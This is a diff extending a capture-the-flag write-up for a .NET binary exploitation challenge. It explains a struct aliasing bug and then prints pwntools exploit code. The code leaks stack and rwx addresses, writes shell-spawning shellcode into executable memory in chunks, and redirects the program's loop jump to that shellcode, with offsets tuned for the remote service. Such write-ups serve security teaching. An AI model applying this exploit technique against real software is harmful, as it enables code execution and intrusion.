@@ -179,8 +179,107 @@ p.interactive()
 ```
 ![pointytail](images/pointytail2.png)
 
-We got Leak an address, because of this leak now I understand a bit about the code, from what I got, in **Main3()** var s represent as **\*\*s**, you can see again in **Main()** function, `PointStruct s = pointStruct;` and the pointStruct is `PointStruct pointStruct = default(PointStruct);`. So in **Main3()** function when the program print `(object)s.x` instead print the value of *pointStruct.x* it will print the address **pointStruct** itself. So that **s** will be pointing to **c**\
+We got Leak an address, because of this leak now I understand a bit about the code, from what I got, in **Main3()** var s represent as **\*\*s**, you can see again in **Main()** function, `PointStruct s = pointStruct;` and the pointStruct is `PointStruct pointStruct = default(PointStruct);`. So in **Main3()** function when the program print `(object)s.x` instead print the value of **pointStruct.x** it will print the address **pointStruct** itself. So that var **s** will be pointing to var **c**.\
 
 Oke let me simply this.\
-var **s** its a pointer contains value of var **c**. So with this we found the bug where we can arbitary write and read. To validate that let's see at gdb.
+var **s** its a pointer contains value of var **c**. So with this we found the bug where we can arbitary write and read.\
+To validate that let's see at gdb.
 ![pointytail](images/pointytail3.png)
+As you can see from picture above we can do arbitary write and read with first index of var **s**, just change it to address where we want to write or read because it's pointing to var **c**.\
+
+### Gain Shell
+We can do arbwrite and arbread and we got leak stack and the mapped area. How to get shell?\
+If you check vmmap, there's many rwxp address there from because of **dotnet**, we can use one of that address to write shellcode.\
+Because we have stack address, we can leak one of rwxp address from stack. Luckily we have one near the address leak we have.
+![pointytail](images/pointytail5.png)
+![pointytail](images/pointytail6.png)
+The offset to the rwxp will be same, With this now we have the rwxp address.
+```py
+def do2hex(f):
+	return (struct.unpack('<Q', struct.pack('<d', f))[0])
+
+def hex2do(f):
+	return struct.unpack('<d', f)[0]
+p.sendline(b'a')
+p.recvuntil(b's = ')
+
+res = (p.recvline()[1:-2]).split(b', ')
+leak = do2hex(float(res[0]))
+stack = do2hex(float(res[1]))
+print(hex(leak), hex(stack))
+
+
+arg1 = hex2do(p64(leak-8))
+arg2 = hex2do(p64(stack))
+p.sendline(f"s {arg1} {arg2}")
+p.sendline(b'1')
+p.recvuntil(b'c = ')
+p.recvuntil(b'c = ')
+res = p.recvline()[1:-2].split(b', ')
+rwxp = do2hex(float(res[0]))-0xe9340
+print("rwxp: ", hex(rwxp))
+```
+Next, because the program run on while(1) loop, we need to find address when it jump back.\
+![pointytail](images/pointytail7.png)
+Now with this we just need to put our shellcode to rwxp, and the overwrite the jump address to our shellcode.\
+Because we can just write 8 bytes, so we need to divide our shellcode.
+```py
+sc = asm(shellcraft.sh())
+chunks, chunk_size = len(sc), len(sc)//6
+sc = [ sc[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]
+print(sc)
+
+target = rwxp
+target_jmp = rwxp+0x14b95
+arg1 = hex2do(p64(target-8))
+arg2 = hex2do(p64(stack))
+p.sendline(f"s {arg1} {arg2}")
+
+payload = b'\x90'*8
+write1 = hex2do((payload))
+write2 = hex2do((payload))
+
+p.sendline(f"c {write1} {write2}")
+
+#Write Shellcode
+for i in range(0,len(sc),2):
+	target = rwxp+((i+1)*8)
+	arg1 = hex2do(p64(target))
+	arg2 = hex2do(p64(stack))
+	p.sendline(f"s {arg1} {arg2}")
+	
+	write1 = hex2do(sc[i])
+	write2 = hex2do(sc[i+1])
+	p.sendline(f"c {write1} {write2}")
+
+
+shell = (asm(f"""
+	nop
+	nop
+	nop
+	nop
+	mov rbx, {rwxp}
+	call rbx
+	"""
+	))
+chunks, chunk_size = len(shell), len(shell)//2
+shell = [ shell[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]
+
+#Overwrite jump while(1) to call rbx
+for i in range(0,len(shell),2):
+	target = target_jmp
+	arg1 = hex2do(p64(target-8))
+	arg2 = hex2do(p64(stack))
+	p.sendline(f"s {arg1} {arg2}")
+	
+	write1 = hex2do(shell[i])
+	write2 = hex2do(shell[i+1])
+	p.sendline(f"c {write1} {write2}")
+```
+Now with this we success gain the shell.
+![pointytail](images/pointytail8.png)
+
+Next run it on nc service, we got some problem, because the environtment is different so the offset its different.\
+![pointytail](images/pointytail9.png)
+The offset on local is 0x9340 and on server is 0x92b0, with this just change the offset from 0xe9340 to 0xe92b0 to get correct rwxp address.
+![pointytail](images/pointytail10.png)
